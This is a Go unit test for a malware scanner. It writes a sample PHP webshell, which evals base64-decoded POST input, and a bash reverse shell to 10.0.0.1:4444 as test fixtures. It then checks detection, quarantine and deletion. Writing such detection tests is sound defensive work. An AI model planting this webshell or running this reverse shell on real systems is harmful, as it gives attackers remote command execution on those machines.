package system

import (
	"io/ioutil"
	"os"
	"path/filepath"
	"testing"
	"time"
)

func TestScannerDetectionAndQuarantine(t *testing.T) {
	sm := InitScannerManager()
	if sm == nil {
		t.Fatalf("Expected non-nil ScannerManager")
	}

	// Create temporary directory for test files
	tempDir, err := ioutil.TempDir("", "scanner_test_*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	// 1. Create a dummy webshell PHP file
	webshellPath := filepath.Join(tempDir, "shell.php")
	webshellContent := `<?php
// Simple webshell
if (isset($_POST['cmd'])) {
    eval(base64_decode($_POST['cmd']));
}
?>`
	if err := ioutil.WriteFile(webshellPath, []byte(webshellContent), 0644); err != nil {
		t.Fatalf("Failed to write test webshell file: %v", err)
	}

	// 2. Create a dummy reverse shell bash file
	revShellPath := filepath.Join(tempDir, "backdoor.sh")
	revShellContent := `#!/bin/bash
/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
`
	if err := ioutil.WriteFile(revShellPath, []byte(revShellContent), 0755); err != nil {
		t.Fatalf("Failed to write test backdoor file: %v", err)
	}

	// Run Custom Scan on tempDir
	rep, err := sm.StartScan(ScanTargetCustom, tempDir, false)
	if err != nil {
		t.Fatalf("StartScan failed: %v", err)
	}
	if !rep.IsScanning {
		t.Errorf("Expected IsScanning == true")
	}

	// Wait for scan completion
	for i := 0; i < 50; i++ {
		time.Sleep(20 * time.Millisecond)
		status := sm.GetStatus()
		if !status.IsScanning && status.Status == "COMPLETED" {
			break
		}
	}

	finalStatus := sm.GetStatus()
	if finalStatus.ThreatsFoundCount < 2 {
		t.Errorf("Expected at least 2 threats found, got %d", finalStatus.ThreatsFoundCount)
	}

	// Test Quarantine on webshellPath
	if err := sm.QuarantineThreat(webshellPath); err != nil {
		t.Fatalf("QuarantineThreat failed: %v", err)
	}

	// Verify original file is gone from original path
	if _, err := os.Stat(webshellPath); !os.IsNotExist(err) {
		t.Errorf("Expected original file to be moved out of original path")
	}

	// Test ReadFileSnippet on remaining backdoor file
	snippet, err := sm.ReadFileSnippet(revShellPath, 512)
	if err != nil {
		t.Fatalf("ReadFileSnippet failed: %v", err)
	}
	if len(snippet) == 0 {
		t.Errorf("Expected non-empty snippet")
	}

	// Test Delete on backdoor
	if err := sm.DeleteThreat(revShellPath); err != nil {
		t.Fatalf("DeleteThreat failed: %v", err)
	}
	if _, err := os.Stat(revShellPath); !os.IsNotExist(err) {
		t.Errorf("Expected deleted file to not exist")
	}
}
